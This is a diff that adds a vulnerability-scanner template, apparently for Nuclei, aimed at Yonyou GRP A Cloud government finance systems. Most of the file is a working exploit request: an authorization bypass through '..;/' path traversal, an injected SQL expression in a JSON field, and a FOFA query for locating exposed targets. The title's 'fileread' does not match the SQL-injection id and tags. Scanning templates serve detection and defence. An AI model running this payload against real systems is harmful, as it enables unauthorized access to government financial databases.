@@ -1,0 +1,31 @@
+id: yonyou-grp-a-cloud-checkGoalResolve-sqli
+
+info:
+  name: 用友 GRP A Cloud 政府财务云系统 checkGoalResolve - fileread
+  author: leadlife
+  severity: high
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-qeury: app="用友-政务财务系统" || body="/pf/portal/login/css/fonts/style.css"
+  tags: yonyou,sqli,oa,grpacloud
+
+http:
+  - raw:
+      - |
+        POST /pub/fe/config/..;/..;/..;/pd/api/performance/checkGoalResolve HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
+        Content-Length: 85
+        Accept: */*
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Content-Type: application/json
+
+        {"params": {"a": "11"}, "sql": "SYS_CONTEXT('USERENV', 'CURRENT_SCHEMA') FROM DUAL;"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,'配置错误')
